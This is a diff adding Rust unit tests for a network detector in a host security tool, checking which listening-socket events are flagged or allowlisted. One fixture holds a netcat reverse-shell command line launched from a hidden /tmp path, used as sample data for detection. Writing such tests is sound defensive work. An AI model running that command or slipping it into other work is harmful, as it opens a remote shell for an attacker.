@@ -1,0 +1,89 @@
+use super::NetworkDetector;
+use crate::detectors::{DetectContext, Detector};
+use sentinel_core::{RawEvent, SentinelConfig};
+use std::sync::Arc;
+
+#[test]
+fn suppresses_expected_web_ports() {
+    let findings = detect_with_default_config(vec![socket_event("network", 443)]);
+    assert!(findings.is_empty());
+}
+
+#[test]
+fn suppresses_stable_generic_public_ports_without_baseline_drift() {
+    let findings = detect_with_default_config(vec![socket_event("network", 4444)]);
+    assert!(findings.is_empty());
+}
+
+#[test]
+fn reports_new_public_port_from_baseline_drift() {
+    let findings = detect_with_default_config(vec![socket_event("baseline", 4444)]);
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-001");
+}
+
+#[test]
+fn reports_suspicious_process_on_expected_web_port() {
+    let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
+        .with_field("protocol", "tcp")
+        .with_field("local_addr", "0.0.0.0")
+        .with_field("local_port", "443")
+        .with_field("process_name", "sh")
+        .with_field("executable", "/tmp/.x/sh")
+        .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")]);
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+}
+
+#[test]
+fn reports_non_suspicious_owner_change_on_expected_web_port() {
+    let findings = detect_with_default_config(vec![RawEvent::new(
+        "baseline",
+        "listening_socket_owner_changed",
+    )
+    .with_field("protocol", "tcp")
+    .with_field("local_addr", "0.0.0.0")
+    .with_field("local_port", "443")
+    .with_field("process_name", "caddy")
+    .with_field("executable", "/usr/bin/caddy")
+    .with_field("previous_process_name", "nginx")
+    .with_field("previous_executable", "/usr/sbin/nginx")]);
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-002");
+}
+
+#[test]
+fn reports_high_risk_public_port_from_current_state() {
+    let findings = detect_with_default_config(vec![socket_event("network", 6379)]);
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "CONFIG-003");
+    assert!(findings[0]
+        .evidence
+        .iter()
+        .any(|item| item.key == "service_profile" && item.value == "Redis"));
+}
+
+#[test]
+fn allowlist_suppresses_high_risk_public_port() {
+    let mut config = SentinelConfig::default();
+    config.allowlist.listening_ports.push(6379);
+    let findings = detect(config, vec![socket_event("network", 6379)]);
+    assert!(findings.is_empty());
+}
+
+fn detect_with_default_config(events: Vec<RawEvent>) -> Vec<sentinel_core::Finding> {
+    detect(SentinelConfig::default(), events)
+}
+
+fn detect(config: SentinelConfig, events: Vec<RawEvent>) -> Vec<sentinel_core::Finding> {
+    let detector = NetworkDetector;
+    let ctx = DetectContext::new(Arc::new(config));
+    detector.detect(&events, &ctx)
+}
+
+fn socket_event(source: &str, port: u16) -> RawEvent {
+    RawEvent::new(source, "listening_socket")
+        .with_field("protocol", "tcp")
+        .with_field("local_addr", "0.0.0.0")
+        .with_field("local_port", port.to_string())
+}
